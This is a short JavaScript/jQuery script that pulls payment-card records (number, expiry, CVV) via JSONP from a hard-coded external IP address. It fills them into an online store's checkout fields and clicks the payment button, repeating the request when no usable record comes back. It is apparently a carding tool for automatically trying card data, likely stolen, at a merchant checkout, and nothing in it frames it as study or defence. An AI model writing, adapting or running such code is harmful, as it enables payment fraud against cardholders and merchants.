var url = "http://186.88.93.43:5000/post";
var jsonp_callback = function(arr) {
  var i = 3;
  var json = arr[i];
  var inic = 4;

  for( var i = 3; i < arr.length; i++ ) {
    json = arr[i]
    if( json.card[0] == inic )
      break;
      
  }

  if ( json ) {
    $("#dwfrm_root_billingpayment_paymentMethod_creditCard_number").val( json.card );

    $("#dwfrm_root_billingpayment_paymentMethod_creditCard_month").val(2).val( json.mon );

    $("#dwfrm_root_billingpayment_paymentMethod_creditCard_year").val("20" + json.year);

    $("#cvnmasked").val(json.cvv);

    $("#creditCardBtn").click();
  }
  else {
    $.ajax({
       url:url,
       dataType: "jsonp"
    });
  }
}
$.ajax({
     url:url,
     dataType: "jsonp"
});
